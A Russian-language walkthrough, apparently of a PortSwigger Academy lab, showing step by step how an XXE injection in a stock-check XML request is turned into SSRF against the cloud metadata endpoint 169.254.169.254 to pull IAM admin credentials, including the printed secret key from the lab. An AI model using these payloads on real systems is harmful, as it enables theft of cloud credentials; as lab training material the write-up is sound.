перейдем на случайную карточку товара и проверим количество товара
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/2.%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks/pics%20for%20walktrough/1.png)
видим, что посылается XML запрос
```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId>2</storeId></stockCheck>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/2.%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks/pics%20for%20walktrough/2.png)
и отправим его в `repeater` 
модифицируем запрос с использованием уязвимость SSRF
```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/2.%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks/pics%20for%20walktrough/3.png)
в ответ получим "Invalid product ID: latest". 
`latest` есть директория, до которой мы достучались
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```
в ответ получим 
`"Invalid product ID: meta-data"`
так дойдем до конца
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/2.%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks/pics%20for%20walktrough/4.png)
финальный запрос будет выглядеть следующим образом
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```
и получим желанный JSON в котором находится секретные админские креды, и вместе с ним получим уведомление об успешно выполненной лабораторной работе
SecretAccessKey" : "jmXiX01ly7IdKQFsZ32uI97bhmstZrVkt5os2DYI" и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/2.%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks/pics%20for%20walktrough/5.png)
